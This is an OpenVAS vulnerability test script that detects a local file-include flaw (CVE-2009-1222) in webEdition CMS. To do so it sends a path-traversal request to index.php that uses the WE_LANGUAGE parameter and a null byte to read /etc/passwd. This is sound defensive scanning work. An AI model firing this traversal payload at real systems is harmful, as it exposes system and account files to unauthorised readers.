###############################################################################
# OpenVAS Vulnerability Test
# $Id: webEdition_34323.nasl 5231 2017-02-08 11:52:34Z teissa $
#
# webEdition CMS 'WE_LANGUAGE' Parameter Local File Include
# Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "webEdition CMS is prone to a local file-include vulnerability
  because it fails to properly sanitize user-supplied input.

  An attacker can exploit this vulnerability to view and execute
  arbitrary local files in the context of the webserver process. This
  may aid in further attacks.

  webEdition CMS 6.0.0.4 is vulnerable; other versions may also be
  affected.";


if (description)
{
 script_id(100103);
 script_version("$Revision: 5231 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-08 12:52:34 +0100 (Wed, 08 Feb 2017) $");
 script_tag(name:"creation_date", value:"2009-04-05 13:52:05 +0200 (Sun, 05 Apr 2009)");
 script_tag(name:"cvss_base", value:"5.1");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-1222");
 script_bugtraq_id(34323);

 script_name("webEdition CMS 'WE_LANGUAGE' Parameter Local File Include Vulnerability");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

dir = make_list("/webEdition","/cms",cgi_dirs());

foreach d (dir)
{ 
 url = string(d, '/index.php?WE_LANGUAGE=../../../../../../../../etc/passwd%00');
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 if( buf == NULL )continue;

 if ( egrep(pattern:"root:.*:0:[01]:.*", string: buf) )
     
 	{    
       	  security_message(port:port);
          exit(0);
        }
}

exit(0);
